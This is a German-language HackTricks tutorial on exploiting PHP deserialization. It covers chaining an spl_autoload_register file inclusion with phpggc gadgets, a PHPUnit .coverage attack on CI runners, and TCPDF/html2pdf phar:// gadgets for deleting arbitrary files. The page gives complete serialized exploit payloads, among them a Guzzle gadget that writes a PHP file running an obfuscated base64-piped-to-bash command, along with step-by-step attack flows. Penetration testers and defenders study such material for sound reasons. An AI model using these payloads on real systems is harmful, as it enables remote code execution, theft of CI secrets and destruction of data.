# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Zuerst solltest du prüfen, was [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php) sind.

## PHP deserialization + spl_autoload_register + LFI/Gadget

Wir befinden uns in einer Situation, in der wir eine **PHP deserialization in einer webapp** gefunden haben, in der **keine** Bibliothek vorhanden ist, die gegenüber Gadgets in **`phpggc`** verwundbar ist. Allerdings gab es im selben Container eine **andere composer webapp mit verwundbaren libraries**. Daher war das Ziel, den **composer loader der anderen webapp** zu laden und diesen auszunutzen, um ein **Gadget zu laden, das diese library mit einem gadget** aus der webapp ausnutzt, die für deserialization verwundbar ist.

Schritte:

- Du hast eine **deserialization** gefunden und es gibt **kein Gadget** im aktuellen App-Code
- Du kannst eine **`spl_autoload_register`** Funktion wie die folgende ausnutzen, um **jede lokale Datei mit der Endung `.php` zu laden**
- Dafür verwendest du eine deserialization, bei der der Name der Klasse in **`$name`** landen wird. Du **kannst kein "/" oder "."** in einem Klassennamen eines serialisierten Objekts verwenden, aber der **Code** **ersetzt** die **Unterstriche** ("_") durch Schrägstriche ("/"). Ein Klassenname wie `tmp_passwd` wird also in `/tmp/passwd.php` umgewandelt und der Code wird versuchen, diese Datei zu laden.\
Ein **gadget example** wird sein: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> Wenn du einen **file upload** hast und eine Datei mit der **`.php` extension`** hochladen kannst, könntest du diese Funktionalität **direkt missbrauchen** und bereits RCE erhalten.

In meinem Fall hatte ich so etwas nicht, aber im **selben Container** gab es eine weitere Composer-Webseite mit einer **library vulnerable to a `phpggc` gadget**.

- Um diese andere library zu laden, musst du zuerst den **composer loader der anderen Web-App laden** (da der der aktuellen Anwendung nicht auf die libraries der anderen zugreifen wird). **Wenn du den Pfad der Anwendung kennst**, kannst du das ganz einfach erreichen mit: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In meinem Fall war der composer loader in `/www/frontend/vendor/autoload.php`)

- Jetzt kannst du den **composer loader** der anderen App **laden**, daher ist es Zeit, die **`generate the phpgcc`** **payload** zu verwenden. In meinem Fall habe ich **`Guzzle/FW1`** genutzt, was mir erlaubte, **jede Datei im Dateisystem zu schreiben**.

- NOTE: Das **generierte gadget funktionierte nicht**; damit es funktionierte, habe ich die payload **`chain.php`** von phpggc **modifiziert** und alle Attribute der Klassen **von private auf public** gesetzt. Wenn nicht, hatten die Attribute der erstellten Objekte nach dem Deserialisieren keine Werte.

- Jetzt haben wir den Weg, den **composer loader der anderen App zu laden** und eine **phpggc payload, die funktioniert**, aber wir müssen **dies in derselben Anfrage tun, damit der Loader geladen ist, wenn das gadget verwendet wird**. Dafür habe ich ein serialisiertes Array mit beiden Objekten geschickt wie:
- Du kannst sehen **zuerst wird der Loader geladen und dann die Payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Jetzt können wir **eine Datei erstellen und schreiben**, allerdings **konnte der Benutzer in keinem Ordner innerhalb des Webservers schreiben**. Wie im payload zu sehen ist, wird in **`/tmp/a.php`** eine PHP-Datei erstellt, die **`system`** mit etwas **base64** aufruft. Dann können wir **den ersten payload-Typ wiederverwenden**, den wir als LFI benutzt haben, um den composer loader der anderen webapp zu laden, **die erzeugte `/tmp/a.php` Datei zu laden**. Füge ihn einfach dem deserialization gadget hinzu:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Zusammenfassung des payloads**

- **Lade den composer autoload** einer anderen Webapp im selben Container
- **Lade ein phpggc gadget**, um eine Library der anderen Webapp auszunutzen (die initiale Webapp, die für Deserialisierung verwundbar war, hatte kein gadget in ihren Bibliotheken)
- Das gadget wird **eine Datei mit einem PHP payload** unter /tmp/a.php erstellen, die bösartige Befehle enthält (der Webapp-Benutzer kann in keinem Ordner einer Webapp schreiben)
- Der letzte Teil unseres payloads wird **die generierte php-Datei laden**, die dann die Befehle ausführt

Ich musste diese Deserialisierung **zweimal aufrufen**. Bei meinen Tests wurde die Datei `/tmp/a.php` beim ersten Mal erstellt, aber nicht geladen; beim zweiten Mal wurde sie korrekt geladen.

### Aktuelle phpggc-Goodies (2025)

- Der **phpggc master branch fügt weiterhin chains hinzu**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 und andere wurden 2025 ergänzt — nützlich, wenn die Ziel-App Vendor-Code mit diesen Projekten teilt. Eine schnelle Suche ist `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (update deinen Clone zuerst).
- Beim Mixen von gadgets über autoloading, beachte, dass **private properties in gadget definitions verloren gehen können**, wenn Klassen im Ziel anders neu-deklariert werden; bearbeite die gadget’s `chain.php`, um die properties `public` zu machen, falls der payload mit leeren Werten ankommt (derselbe Trick wie oben).

## PHPUnit PHPT coverage Deserialisierung (CI/CD entrypoint)

`phpunit` vor **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) hat willkürliche PHP-Objekte aus `.coverage`-Dateien des **PHPT runner** unserialisiert. In CI-Pipelines, in denen nicht vertrauenswürdige Mitwirkende Tests pushen können, führt das Ablegen einer manipulierten `.coverage`-Datei sofort bei Ausführung der Suite zur Deserialisierung — kein Webzugriff erforderlich.

**Angriffsablauf**

1. Platziere eine bösartige `.coverage`-Datei im Repo (oder Artifact), die ein serialisiertes gadget enthält, das in den Testabhängigkeiten vorhanden ist (z. B. eine Monolog- oder Guzzle-chain aus phpggc).
2. Reiche einen PR ein; wenn CI `phpunit --configuration phpunit.xml` ausführt, liest der PHPT runner die Coverage-Datei und deserialisiert das gadget, was **RCE inside the runner container** ermöglicht.
3. Das ist besonders schlimm, wenn Tests CI-Secrets mounten (cloud creds, deployment keys).

**Minimal malicious coverage stub** (neben einem PHPT-Test ablegen):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Run the PHPT so phpunit consumes `exploit.coverage`.

## TCPDF `__destruct` POP chain for arbitrary file deletion

Wenn eine echte `TCPDF`-Instanz garbage-collected wird, ruft sie `_destroy(true)` auf, iteriert über `$this->imagekeys` und führt `unlink()` für alles aus, was wie eine Cache-Datei unter `K_PATH_CACHE` aussieht. Wenn eine Anwendung `unserialize($user_data)` ausführt, während die `TCPDF`-Klasse geladen ist (z. B. weil sie ein Array mit dem Schlüssel `html` erwartet), kannst du ein serialisiertes Objekt liefern, das setzt:

- `file_id` auf eine beliebige Ganzzahl, die nicht in `self::$cleaned_ids` vorhanden ist (z. B. `-1`).
- `imagekeys` auf Pfade, die mit `K_PATH_CACHE` beginnen oder so aussehen können (z. B. `/tmp/../tmp/do_not_delete_this_file.txt`, wenn `K_PATH_CACHE` `/tmp/` ist).

Beispiel-Payload, die einen unsicheren `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);`-Ablauf trifft:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Die Datei wird gelöscht, sobald das Objekt aus dem Scope fällt. TCPDF 6.9.3 verschärfte die Prüfung, sodass nur noch Pfade mit dem Präfix `__tcpdf_<file_id>_` innerhalb von `K_PATH_CACHE` entfernt werden, und führte `_unlink()` ein, um nicht-`file://`-Schemes zu blockieren — ältere `Producer`-Versionen sind daher ideale Ziele.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) kapselt TCPDF und stellt einen benutzerdefinierten `<cert>`-Block bereit, dessen `src`/`privkey`-Attribute mit einfachem `file_exists()` validiert werden. Auf PHP < 8.0 bewirkt jede Dateisystemfunktion, die eine `phar://`-URL berührt, dass die Phar-Metadata unsererialisiert werden. Indem man das oben beschriebene bösartige TCPDF-Objekt in einer Phar-Archiv-Metadaten speichert, erhält man eine zuverlässige POP, selbst wenn die Anwendung niemals `unserialize()` selbst aufruft.

1. Erstelle ein Phar mit `phar.readonly=0`, setze den Stub/Manifest so, dass er wie ein Bild aussieht (z. B. `archive.phar` in `archive.png` umbenennen), und speichere das serialisierte TCPDF-Objekt in den Phar-Metadaten.
2. Lade/platziere die Datei an einem erreichbaren Ort, z. B. `/tmp/user_files/user_1/archive.png`.
3. Sende HTML, das das `<cert>`-Tag enthält, sodass html2pdf den vom Angreifer kontrollierten Pfad auflöst:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Der Aufruf von `file_exists()` deserialisiert die Metadaten, instanziiert TCPDF, und sein Destruktor löscht die gewählte Datei, wodurch html2pdf zu einem mächtigen `phar://`-Einstiegspunkt wird. Version 5.3.1 fügte `Security::checkValidPath()` hinzu, um nicht genehmigte Schemata zu blockieren, sodass veraltete Bereitstellungen weiterhin attraktiv bleiben.

## Referenzen

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
